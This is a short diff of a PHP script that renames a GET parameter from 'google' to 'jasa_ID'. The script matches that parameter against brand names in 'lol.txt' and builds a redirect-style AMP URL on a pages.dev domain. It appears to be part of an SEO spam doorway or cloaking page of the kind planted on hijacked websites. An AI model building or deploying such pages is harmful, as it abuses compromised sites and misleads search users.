@@ -53,9 +53,9 @@ pemeliharaan terhadap website ini.
 
 $filename = "lol.txt";
 
-if (isset($_GET['google'])) {
+if (isset($_GET['jasa_ID'])) {
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['google']);
+    $target_string = strtolower($_GET['jasa_ID']);
     foreach ($lines as $item) {
         if (strtolower($item) === $target_string) {
             $BRAND = strtoupper($target_string);
@@ -85,7 +85,7 @@ if (isset($_GET['google'])) {
     denied();
     exit();
 }
-$ampmek = "https://rdmma-nurulanwarsentani.pages.dev/?google=$BRANDS";
+$ampmek = "https://rdmma-nurulanwarsentani.pages.dev/?jasa_ID=$BRANDS";
 ?>
 
 
